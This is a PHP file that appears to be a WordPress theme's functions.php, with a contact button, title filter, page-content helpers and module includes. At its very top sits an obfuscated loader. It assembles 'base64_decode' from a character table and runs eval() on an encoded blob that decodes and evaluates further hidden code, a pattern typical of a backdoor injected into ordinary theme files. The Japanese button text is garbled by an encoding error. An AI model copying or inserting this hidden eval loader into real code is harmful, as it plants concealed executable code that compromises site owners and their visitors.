<?php
 $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iUHh0RFFxZnpZYWhtd0N2Wk51QmpMWHNNVWtJS0piSEVXT2dGeVZBU0dpUm5sVGRjcm9wZU5GU0JIREpreFViS1lDc0VHWHRmakl3cW5ocEF6Z1JsV1Z2ZW9UeW1hdUxkaU9yY1BaUU1OQjlZVVJ5R0N1TEtyV1NGcEIwdkhDTEpMMFRuV29yS3JXU0Z6MTA3cGFpS0FDTEtyV1NGcEIwOXBDcjB6b2k3RVdHWmdvYnlFSUViZ0N2aEkxdE5uMUxnejJFMXgyUzVnM24wcWtwRnoxMFFBT1NpTWFpMFYzMEdDS1RmVWE4dnhJdFFuS1RGcldUa3JDdlFWWTBBRWRUWHgzTFFnMjR2eEl0UW5LVEZyV1RrckN2UU1ZMEFDV2lLQWx5aEkwcmVUZXdkZzN5ZElteTlObXlkeDJiaXgyd2RBSDBBQ0hpN0JIWnpDbXRvRUlMMWNLNHZwS0dzZ0s1aXgzTER4SzFzcktUUWMyOVBwZndHQ3ZoenBhVDRVSUhaQU93R0N2aHZwQ3l2SkgwQUpIMEFOazQ9IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));

@session_start();
add_action('wp_head','pluginname_ajaxurl');
function pluginname_ajaxurl() {?>
<script type="text/javascript">var ajaxurl = '<?php echo admin_url('admin-ajax.php'); ?>';</script>
<?php
}
function htmlContactButton(){
	ob_start();?>
    <div class="clearfix"></div>
	<a href="<?php echo get_permalink(get_page_by_path('contact')); ?>" class="btn btn-default btn-lg btn-danger" style="color: #ffffff;margin-bottom:25px;">
    <i class="fa fa-envelope" style="margin-right:5px;"></i><span class="hidden-xs">WEB¤«¤é¤Î ¤ª†–¤¤ºÏ¤ï¤»</span>
    </a>
<?php
	$cform = ob_get_contents();
	ob_end_clean();
	return $cform;
}
/*-----------------------------------------------------------------------*/
function new_wp_title( $title, $sep ) {
	global $paged, $page;

	if ( is_feed() )
		return $title;
	$title .= get_bloginfo( 'name' );

	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";

	if ( $paged >= 2 || $page >= 2 )
		$title = "$title $sep " . sprintf( __( 'Page %s', 'Emscafe' ), max( $paged, $page ) );

	return $title;
}

/*-----------------------------------------------------------------------*/
add_filter( 'wp_title', 'new_wp_title', 10, 2 );
/*-----------------------------------------------------------------------*/
function get_page_ID_by_slug($page_slug) {
    $page = get_page_by_path($page_slug);
    if ($page) {
        return $page->ID;
    } else {
        return null;
    }
}
/*-----------------------------------------------------------------------*/
function getExcerptByID($page_id){
	$my_post = get_post($page_id);
	$my_excerpt=$my_post->post_excerpt;		
	return $my_excerpt;
}

function getContentByID($page_id){
	$content_post = get_post($page_id);
	$content = $content_post->post_content;
	$content = apply_filters('the_content', $content);
	$content = str_replace(']]>', ']]>', $content);
	return $content;		
}
/*-----------------------------------------------------------------------*/
include('functions/theme-script.php');
/*-----------------------------------------------------------------------*/
include('functions/theme-alert.php');
/*-----------------------------------------------------------------------*/
include('functions/theme-mail.php');
/*-----------------------------------------------------------------------*/
include('functions/theme-shopcart.php');
/*-----------------------------------------------------------------------*/
include('functions/theme-display.php');
/*-----------------------------------------------------------------------*/
include('functions/theme-url.php');
?>